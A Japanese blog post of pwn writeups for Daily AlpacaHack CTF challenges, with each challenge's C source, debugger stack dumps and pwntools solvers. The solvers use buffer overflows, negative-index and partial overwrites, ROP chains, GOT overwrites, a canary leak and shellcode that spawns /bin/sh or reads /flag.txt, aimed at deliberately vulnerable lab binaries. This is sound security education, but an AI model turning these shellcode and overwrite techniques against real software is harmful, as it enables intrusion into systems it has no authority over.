+++
date = 2026-04-25
title = "Daily AlpacaHack 1-4月分 (pwn)"
[taxonomies]
tags = ["CTF"]
+++

## これは何
Daily AlpacaHackの1月から4月分のpwn問writeupです。

## Basic Buffer Overflow
No Canaryで`main`の関数アドレスがリークしている。offsetは72バイト。
```python
def main():
    conn.recvuntil(b": ")
    addr_main = int(conn.recvline().strip(), 16)
    elf.address = addr_main - elf.sym["main"]
    info(f"[+] binary base: {elf.address:#x}")

    payload = b"A" * 72 + p64(elf.sym["win"])
    conn.sendlineafter(b"> ", payload)
        
    conn.interactive()
```
## Integer Writer
負数indexが許可される。`integers[pos]`への書き込みは`scanf`の関数フレームが`main`よりも低位アドレスに作成されたあとに行われる。つまり`scanf`のリターンアドレスを、高位アドレス側である`main`の変数`integers`から負数indexで参照することができる。
```c
int main(void) {
    int integers[100], pos;

    /* ... */

    printf("pos > ");
    scanf("%d", &pos);
    if (pos >= 100) {
        puts("You're a hacker!");
        return 1;
    }
    printf("val > ");
    scanf("%d", &integers[pos]);

    return 0;
}
```

`integer[0]`に1を書き込んだ時。4バイト単位であり、また`scanf`のリターンアドレスは今のスタックフレームのすぐ上にあることから、`-6`で参照できることが分かる
```
              : ??????????????????      return address of scanf
0x7ffe9db92120: 0x00007ffe9db927a9      0x0000000000000240
0x7ffe9db92130: 0x0000034000000001      0x0000058000000380
0x7ffe9db92140: 0x0000098000000980      0x0000098000000980
0x7ffe9db92150: 0x0000098000000980      0x0000098000000980
```

```python
def main():
    pos = -6
    val = elf.sym["win"]
    conn.sendlineafter(b"> ", str(pos).encode())
    conn.sendlineafter(b"> ", str(val).encode())
    conn.interactive()
```
## Short Writer
Integer Writerと同じだが、`integers`ではなく、`shorts`になっている。つまり4バイトではなく2バイトの書き込みになってる。

`scanf`のリターンアドレスと、`win`の先頭アドレスは下位12bitを除いて一致していることが分かる。かつ、ASLR有効下でも、アドレスの下位12bitはランダマイズされないことが知られている。理想的には負数indexによって`scanf`のリターンアドレスの下位12bitを上書きしたいが2バイト = 16bitの上書きであるため、実行ごとに変わる4bitが存在する。

`win`の開始アドレスのオフセットは`0x11e9`。しかしASLR有効下だと考えると、下位12bitである`0x01e9`は固定で、残り4bitは不定となっている。そのため今回はとりあえず何度か試行することで決め打ちのアドレスが当たることを期待する。

```
   0x000055ddac5fb2fc <+239>:   call   0x55ddac5fb0f0 <__isoc99_scanf@plt>
   0x000055ddac5fb301 <+244>:   mov    eax,0x0

   0x000055ddac5fb1e9 <+0>:     endbr64
   0x000055ddac5fb1ed <+4>:     push   rbp
   0x000055ddac5fb1ee <+5>:     mov    rbp,rsp
   0x000055ddac5fb1f1 <+8>:     mov    edx,0x0
   0x000055ddac5fb1f6 <+13>:    mov    esi,0x0
   0x000055ddac5fb1fb <+18>:    lea    rax,[rip+0xe02]        # 0x55ddac5fc004
   0x000055ddac5fb202 <+25>:    mov    rdi,rax
   0x000055ddac5fb205 <+28>:    call   0x55ddac5fb0e0 <execve@plt>
   0x000055ddac5fb20a <+33>:    nop
   0x000055ddac5fb20b <+34>:    pop    rbp
   0x000055ddac5fb20c <+35>:    ret
```

```python
def main():
    pos = -12
    val = 0xb1e9
    conn.sendlineafter(b"> ", str(pos).encode())
    conn.sendlineafter(b"> ", str(val).encode())
    conn.interactive()
```
## Shellcode 101
シェルコードを送信するだけでそのまま実行される。
```python
def main():
    shellcode = asm(f'''
	    xor esi, esi
	    push rsi
	    mov rbx, 0x68732f2f6e69622f
	    push rbx
	    push rsp
	    pop rdi
	    imul esi
	    mov al, {constants.SYS_execve}
	    syscall
    ''')

    conn.sendlineafter(b"> ", shellcode)
    conn.interactive()
```
## Alpaca-Llama Ranch
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

#define MAX_N_ANIMAL 0x40

long animal_numbers[MAX_N_ANIMAL];

void handler() {
    execve("/bin/sh",NULL,NULL);
}

int main(void) {
    signal(SIGSEGV, handler);
    unsigned alpaca, llama, i;
    puts("Input the number of alpaca.");
    scanf("%u%*c",&alpaca);
    puts("Input the number of llama.");
    scanf("%u%*c",&llama);
    if (alpaca+llama > MAX_N_ANIMAL) {
        puts("Hmm....");
        exit(1);
    }
    i=0;
    while(i<alpaca) {
        printf("Question %u(Alpaca): Input the identity number.",i);
        scanf("%ld%*c",&animal_numbers[i++]);
    }
    while(i<alpaca+llama) {
        printf("Question %u(Llama): Input the identity number.",i);
        scanf("%ld%*c",&animal_numbers[i++]);
    }
    puts("Thanks for the information!");
    return 0;
}
```

セグフォさせればシェルが取れる気配がある。おそらくは配列アクセス時に何かしらのInvalidなアクセスを行うことが方針だと思われる。

ここで、`MAX_N_ANIMAL`のチェックに対して`alpaca + llama = (2**32 - 1) + 1`を考えてみる。この時、unsignedの最大値+1なためoverflow(`=0`)し、`if`文のチェックをすり抜けることができると分かる。

最後に、`alpaca`自体は`2**32 -1`なので、大域に取られている`animal_numbers`の領域を超えて、マッピングされていない領域へのアクセスを行うようになり、セグフォが発生する

最初はループを`alpaca`の回数分回していたが、505回目でループが止まることが分かった。
このためループを505回回すようにしてみるとシェルが取れることが分かる。
```python
def main():
	# 2**32 -1 or -1 or 4294967295
    alpaca =  4294967295 
    llama = 1
    conn.recvline()
    conn.sendline(str(alpaca).encode())
    conn.recvline()
    conn.sendline(str(llama).encode())

    for i in range(505):
        info(f"[+] trying {i}")
        conn.sendlineafter(b".", b"0")

    conn.interactive()
```

## simple ROP
自明なBoFが存在する。return addressまでのoffsetは72バイトで、かつ引数を3つ設定する必要があった。なおSolverは興が乗りすぎた。ちなみに4番の方法が一番書いている実感がある。
```python
def main():
    conn.recvuntil(b": ")
    win_leak = int(conn.recvline().strip(), 16)
    elf.address = win_leak - elf.sym["win"]
    info(f"leaked win: {win_leak:#x}")

    rop = ROP(elf)
    rop.raw(b"A"*72)

    # 1. 最も楽な方法
    rop.win(0xdeadbeefcafebabe, 0x1122334455667788, 0xabcdabcdabcdabcd)

    # 2. レジスタを指定して書き込む方法。稀に役立つ
    # rop.rdi = 0xdeadbeefcafebabe
    # rop.rsi = 0x1122334455667788
    # rop.rdx = 0xabcdabcdabcdabcd
    # rop.raw(elf.sym["win"])

    # 3. 正直 rop.win()と書ける以上こちらを利用する理由が無い
    # rop.call("win", [0xdeadbeefcafebabe, 0x1122334455667788, 0xabcdabcdabcdabcd])

    payload = rop.chain()

    # 4. 全てを完全にコントロールしたい場合
    # payload = flat(
    #     b"A" * 72,
    #     elf.address + 0x00000000000011e9,	# pop rdi; ret
    #     0xdeadbeefcafebabe,
    #     elf.address + 0x00000000000011eb,	# pop rsi; ret
    #     0x1122334455667788,
    #     elf.address + 0x00000000000011ed,	# pop rdx; ret
    #     0xabcdabcdabcdabcd,
    #     elf.sym["win"],
    # )

    conn.sendlineafter(b"> ", payload)
    conn.interactive()
```
## disappeared
```c
// gcc -DNDEBUG -o chal main.c -no-pie
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win() { execve("/bin/sh", NULL, NULL); }

void safe() {
  unsigned num[100], pos;
  printf("pos > ");
  scanf("%u", &pos);
  assert(pos < 100);
  printf("val > ");
  scanf("%u", &num[pos]);
}

int main(void) {
  /* disable stdio buffering */
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  safe();

  return 0;
}
```

コンパイルオプションに`-DNDEBUG`が付与されているため、`assert()`は無効になる。つまりindexのチェックが無効になるため`pos`をリターンアドレスに合わせて`val`に`win`のアドレスを書き込んでやれば良い。

`pos = 0, val = 0xdeadbeef`で実行した際のスタックは下記。リターンアドレスは`0x7ffdfb3a6728`であり、`num[0]`の位置は`0x7ffdfb3a6580`であることから`pos=106`でリターンアドレスを指せることが分かる。
```
gef> x/100gx $rsp
0x7ffdfb3a6570:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6580:	0x00000000deadbeef	0x0000000000000000
0x7ffdfb3a6590:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a65a0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a65b0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a65c0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a65d0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a65e0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a65f0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6600:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6610:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6620:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6630:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6640:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6650:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6660:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6670:	0x0000000000000000	0x00007f31922494a0
0x7ffdfb3a6680:	0x00007ffdfb3a66c0	0x00007f31920f17b1
0x7ffdfb3a6690:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a66a0:	0x0000000000000000	0x00007f31922494a0
0x7ffdfb3a66b0:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a66c0:	0x00007ffdfb3a66e0	0x00007f31920eebf6
0x7ffdfb3a66d0:	0x0000000000000800	0x00007f31922494a0
0x7ffdfb3a66e0:	0x00007ffdfb3a6720	0x00007f31920e45af
0x7ffdfb3a66f0:	0x0000008c00000006	0x0000000000000000
0x7ffdfb3a6700:	0x0000000000000000	0x0000000000000000
0x7ffdfb3a6710:	0x00007ffdfb3a6868	0x47c579ed46fbef00
0x7ffdfb3a6720:	0x00007ffdfb3a6730	0x00000000004012d0 <- retaddr

...

gef> p/d (0x7ffdfb3a6728 - 0x7ffdfb3a6580) / 4
$1 = 106
```

```python
def main():
    pos = 106
    val = elf.sym["win"]
    conn.sendlineafter(b"> ", str(pos).encode())
    conn.sendlineafter(b"> ", str(val).encode())
    conn.interactive()
```

拍子抜けである。

## Noob programmer
方針が一発で思いついてニッコリ。

```c
// gcc -o chal main.c -no-pie -fno-stack-protector

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win() {
    execve("/bin/sh",NULL,NULL);
}

void ask_room_number() {
    long age;
    printf("Input your room number> ");
    scanf("%ld",age);
    printf("Ok! I'll visit your room!");
}

void show_welcome() {
    char name[0x20];
    printf("Input your name> ");
    fgets(name,sizeof(name),stdin);
    printf("Welcome! %s",name);
}

int main(void) {
    /* disable stdio buffering */
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    show_welcome();
    ask_room_number();

    return 0;
}
```

`show_welcome`時点でのスタック
```

gef> x/50gx $rsp
0x7ffcc319c230:	0x4141414141414141	0x4141414141414141
0x7ffcc319c240:	0x4141414141414141	0x0041414141414141
0x7ffcc319c250:	0x00007ffcc319c260	0x00000000004012d0
```

`ask_room_number`内部の`scanf`における、`rsi`が持つ値を見てみる。`rsi`は、`rbp-0x8`をアドレスとして、そのアドレスが持つ値が代入されている。つまり、`name[0x18 - 0x1f]`までの内容を`scanf`による書き込み先アドレスとして解釈させることができると分かった。
```
Dump of assembler code for function ask_room_number:
   0x00000000004011da <+0>:	endbr64
   0x00000000004011de <+4>:	push   rbp
   0x00000000004011df <+5>:	mov    rbp,rsp
   0x00000000004011e2 <+8>:	sub    rsp,0x10
   0x00000000004011e6 <+12>:	lea    rax,[rip+0xe1f]        # 0x40200c
   0x00000000004011ed <+19>:	mov    rdi,rax
   0x00000000004011f0 <+22>:	mov    eax,0x0
   0x00000000004011f5 <+27>:	call   0x401090 <printf@plt>
   0x00000000004011fa <+32>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004011fe <+36>:	mov    rsi,rax
   0x0000000000401201 <+39>:	lea    rax,[rip+0xe1d]        # 0x402025
   0x0000000000401208 <+46>:	mov    rdi,rax
   0x000000000040120b <+49>:	mov    eax,0x0
=> 0x0000000000401210 <+54>:	call   0x4010c0 <__isoc99_scanf@plt>

gef> p/x $rbp-0x8
$1 = 0x7ffcc319c248
gef> i r rsi
rsi            0x41414141414141    0x41414141414141
```

任意アドレスにwriteできるかつ今回はPIE無しなのでGOT Overwriteで`printf`のGOTエントリを`win`に上書きして終わり。

```python
def main():
    name = b"A"*24 + p32(elf.got["printf"]) + b"\x00" * 3
    age = elf.sym["win"]
    conn.sendlineafter(b"> ", name)
    conn.sendlineafter(b"> ", str(age).encode())
    conn.interactive()
```

`fgets`は`size-1`までを読み込むため、`0x20`ギリギリを渡すと、1バイトが残り`scanf`に渡ってしまう問題があった。

## kappa-overflow
windows問で面食らった。
```c
#include <stdio.h>
#include <windows.h>

void win() {
    SetConsoleOutputCP(65001);

    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        puts("flag file not found");
        return;
    }
    char buf[128];
    fgets(buf, sizeof(buf), fp);
    puts(buf);
    fclose(fp);
}

LONG WINAPI handler(EXCEPTION_POINTERS *ExceptionInfo) {
    fprintf(stderr, "\nException code: 0x%lx\n", ExceptionInfo->ExceptionRecord->ExceptionCode);
    win();
    ExitProcess(0);
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    SetUnhandledExceptionFilter(handler);

    struct {
        char buf[64];
        volatile int *target;
    } cache;

    int dummy = 0;
    cache.target = &dummy;

    puts("Input:");
    fflush(stdout);

    gets(cache.buf);

    *cache.target = 1;
    
    puts("OK");
    return 0;
}
```

脆弱性自体はBoFで、`cache.target`にも書き込めることが予想できた。`SetUnhandledExceptionFilter`が気になったためMSの[ドキュメント](https://learn.microsoft.com/ja-jp/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter)を参照してみる。

> この関数を呼び出した後、デバッグされていないプロセスで例外が発生し、例外によってハンドルされない例外フィルターに例外が発生した場合、そのフィルターは _lpTopLevelExceptionFilter_ パラメーターで指定された例外フィルター関数を呼び出します。

つまり例外を引き起こせれば、今回の問題ではフラグが取れることが分かる。`*cache.target = 1`という処理があるため、`cache.target`に無効なアドレスを配置できればそのまま例外が引き起こされる。

```python
#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    conn = remote("34.170.146.252", 13627)
else:
    conn = process(["wine", "./chall.exe"])

def main():
    conn.sendline(b"A"*64 + b"B"*8)
    conn.interactive()

if __name__ == "__main__":
    main()
```

## canary-leak
```c
// gcc chall.c -o chall -fstack-protector -O0
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

void vuln(){
    unsigned long *canary;
    unsigned long canary_saved;
    unsigned long input;
    char buf[64];

    canary = (unsigned long *)(buf + 0xc8);
    canary_saved = *canary;

    puts("Input:");
    read(0, buf, 0xcf);
    
    puts("Output:");
    puts(buf);

    puts("Canary?");
    read(0, &input, 8);

    if(canary_saved == input){
        FILE *fp = fopen("flag.txt","r");
            char flag[128];
            fgets(flag, sizeof(flag), fp);
            puts(flag);
    }else{
        puts("Nope");
    }
}

int main(){
    setvbuf(stdout,NULL,_IONBF,0);
    setvbuf(stdin,NULL,_IONBF,0);

    vuln();
}
```

カナリアのコピーを取得し、ユーザ入力とカナリアが一致すればフラグが入手できる。カナリアは`buf+0xc8`に位置しており、かつカナリアの1バイト目は`0x00`であるため、`buf`に対して`0xc9`の入力を送りつけるとカナリアが文字列としてリークする。あとはそれをそのまま送り返せば良い。ただし、カナリアは`0x00`の1バイトを潰しているため、`rjust`で付与する。

```python
def main():
    conn.recvline()
    conn.send(b"A" * 0xc9)
    conn.recvline()
    canary = conn.recvuntil(b"Canary?\n")[0xc9:0xc9+7].rjust(8, b"\x00")
    conn.send(canary)
    conn.interactive()
```

## vuln4vuln
```c
// gcc chal.c -o chal -no-pie

#include <stdio.h>
#include <unistd.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <string.h>

#define PASSWD "ALPACAPA\n"

char name[0x10];
char passwd[0x10];
struct iovec iov;

void win() {
    execve("/bin/sh", NULL, NULL);
}

int main() {
    iov.iov_base = passwd;
    iov.iov_len = sizeof(passwd);
    fgets(name,0x28,stdin);
    readv(STDIN_FILENO,&iov,1);
    if (strcmp(passwd, PASSWD) == 0) {
        printf("Welcome! %s\n",name);
    } else {
        printf("Wait a minute, who are you?\n");
    }
}

__attribute__((constructor))
void setup() {
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
}
```

`readv`及び`struct iovec`の定義は下記。`readv`は`iocnt`で指定された回数分を`fd`から`iovec`のバッファに格納する。また、`readv`は複数のバッファにデータを読み込むという点を除いて`read`と全く同様の動作を行う。
```c
ssize_t readv(int fd, struct iovec *iov, int iovcnt);

struct iovec {
    void  *iov_base;    /* Starting address */
    size_t iov_len;     /* Number of bytes to transfer */
};
```


`name, passwd, iov`の位置関係を見てみる。`fgets`は`0x20`の`name`に対して`0x28`を書き込めるため、ここでは`iov`の書き込み先アドレスまでコントロールできることが分かる。あとは`puts`(アセンブリを見れば分かるが`printf`ではない)のGOTを`win`に書き換えればシェルが取れる
。
```
gef> x/50gx 0x404070
0x404070 <name>:	0x0000000a41414141	0x0000000000000000
0x404080 <passwd>:	0x0000000000000000	0x0000000000000000
0x404090 <iov>:	0x0000000000404080	0x0000000000000010
```


```python
def main():
    # fgets recv up to 0x27
    payload = flat(
        b"A" * 0x20,
        elf.got["puts"],
    )[:0x27]
    conn.send(payload)

    # readv
    conn.send(p64(elf.sym["win"]))

    conn.interactive()
```

## login-bonus-2
```c
#include <stdio.h>
#include <string.h>

#define debug_report(progname, fmt, ...) printf("%s: " fmt "\n", progname, ##__VA_ARGS__)

char g_flag[100];

int main(int argc, char **argv) {
  /* Input password */
  char password[100];
  printf("Password: ");
  scanf("%[^\n]", password);

  /* Check password */
  if (strcmp(password, g_flag)) {
    debug_report(argv[0], "Auth NG");
    debug_report(argv[0], "Invalid password: %s", password);

  } else {
    debug_report(argv[0], "Auth OK");
    debug_report(argv[0], "FLAG: %s", g_flag);
  }
  
  return 0;
}

__attribute__((constructor))
void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Read the flag into `g_flag` */
  FILE *fp = fopen("/flag.txt", "r");
  if (!fp) {
    strcpy(g_flag, "FLAG{dummy}");
  } else {
    fread(g_flag, 1, sizeof(g_flag), fp);
    fclose(fp);
    /* Remove newline */
    g_flag[strcspn(g_flag, "\n")] = '\0';
  }
}
```

`scanf`は書式文字列でサイズが指定されていないとBoFでできたらしい。`argv[0]`を上書きできれば良い気がする。`printf`直前を見てみる。`rbp-0x80`にある値をアドレスとして解釈し、さらにその中にある値をアドレスとして解釈し、それを`rsi`に代入していると分かる。
```
   0x00000000004011fe <+88>:	mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000401202 <+92>:	mov    rax,QWORD PTR [rax]
   0x0000000000401205 <+95>:	mov    rsi,rax
   0x0000000000401208 <+98>:	mov    edi,0x402015
   0x000000000040120d <+103>:	mov    eax,0x0
=> 0x0000000000401212 <+108>:	call   0x401070 <printf@plt>
```

レジスタとメモリも見てみる。`rbp-0x80`は`passwd`よりも下位アドレスに存在するため上書きできないが、`rbp-0x80`が持つ値(`0x00007fff30a09e88`)は`passwd`のアドレス`0x7fff30a09ce0`よりも高位に存在するため、`0x00007fff30a09e88`までBoFで到達した後、その領域を`g_flag`へのアドレスで上書きすれば良さそうだと分かる。
```
gef> i r
rax            0x0                 0x0
rbx            0x0                 0x0
rcx            0x46                0x46
rdx            0x0                 0x0
rsi            0x7fff30a0b693      0x7fff30a0b693
rdi            0x402015            0x402015
rbp            0x7fff30a09d50      0x7fff30a09d50
rsp            0x7fff30a09cd0      0x7fff30a09cd0

gef> x/gx 0x7fff30a09d50-0x80
0x7fff30a09cd0:	0x00007fff30a09e88

gef> x/gx 0x00007fff30a09e88
0x7fff30a09e88:	0x00007fff30a0b693

gef> x/gx 0x00007fff30a0b693
0x7fff30a0b693:	0x006e69676f6c2f2e

gef> x/s 0x00007fff30a0b693
0x7fff30a0b693:	"./login"
```

`passwd`からのオフセットは下記で算出できる。`offset = 0x1a8`だった。
```
[rbp-0x80] - &passwd = 0x1a8

gef> p/x 0x00007fff30a09e88 - 0x7fff30a09ce0
$2 = 0x1a8
```

つまり`passwd`の先頭アドレス+`0x1a8`した先に、`g_flag`のアドレスを書き込めば`printf`時に`rsi`に渡されることが分かる。

この後リモートにもペイロードを送ってみたのだがスタックのレイアウトが異なるのか、Exploitできなかった。そのため`g_flag`のアドレスの連続を送りつけることでフラグを取得した。なお、`100`は決め打ちであるが、多分多すぎる。
```python
def main():
    if (args.REMOTE):
        payload = p64(elf.sym["g_flag"]) * 100
    else:
        payload = b"A" * 0x1a8 + p64(elf.sym["g_flag"])

    conn.sendlineafter(b": ", payload)
    conn.interactive()
```

## pacapaca sc
```c
#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <seccomp.h>

int main(void){
    void *shellcode;
    ssize_t n;
    scmp_filter_ctx ctx;

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode == MAP_FAILED) _exit(1);
    printf("paca?\n");
    n = read(0, shellcode, 0x1000);
    if (n <= 0) _exit(1);

    ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) _exit(1);

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) < 0) _exit(1);
    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) < 0) _exit(1);
    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) < 0) _exit(1);
    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0) _exit(1);

    if (seccomp_load(ctx) < 0) _exit(1);
    seccomp_release(ctx);
    printf("paca!\n");
    ((void (*)(void))shellcode)();
    
}
```

勘違いしていたが、`SCMP_ACT_ALLOW`なので`open/read/write/openat`は許可されている。拒否されていると勘違いして1時間は悩んだ。方針自体は簡単で`open -> read -> wirte`で終わりである。

```python
def main():
    shellcode = asm(f'''
    open:
        mov rsi, 0
        lea rdi, [rip+flag]
        mov rax, {constants.SYS_open}
        syscall
    read:
        mov rdx, 100
        lea rsi, [rip+buf]
        mov rdi, rax
        mov rax, {constants.SYS_read}
        syscall
    write:
        mov rdx, 100
        lea rsi, [rip+buf]
        mov rdi, 1
        mov rax, {constants.SYS_write}
        syscall
    flag:
        .string "/flag.txt"
    buf:
        .space 100
    ''')

    print(disasm(shellcode))

    conn.recvline()
    conn.sendline(shellcode)
    conn.interactive()
```

## 終わりに
前回にdriver4bとNo Controlをすると言ったが完全に忘れてこれを出した。反省はしている。
